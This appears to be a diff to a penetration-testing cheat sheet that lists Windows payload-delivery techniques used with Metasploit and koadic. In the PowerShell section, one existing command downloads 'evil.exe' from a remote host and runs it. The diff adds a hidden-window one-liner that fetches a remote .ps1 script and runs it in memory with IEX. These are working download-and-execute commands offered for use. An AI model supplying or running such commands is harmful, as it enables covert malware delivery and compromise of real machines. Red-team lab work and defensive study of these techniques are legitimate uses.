@@ -39,9 +39,14 @@ My testcase are mostly using msvenom with metasploit and koadic.
 
 ## Powershell
 
-Download and execute
+Download and execute executable
 ```
 powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/evil.exe', '%temp%\evil.exe'); Start-Process -Filepath '%temp%\evil.exe'"
+```
+
+Execute Ps1 file
+```
+powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.5.128/a.ps1\");powershell -nop -w hidden -c IEX $e
 ```
 
 Powercat
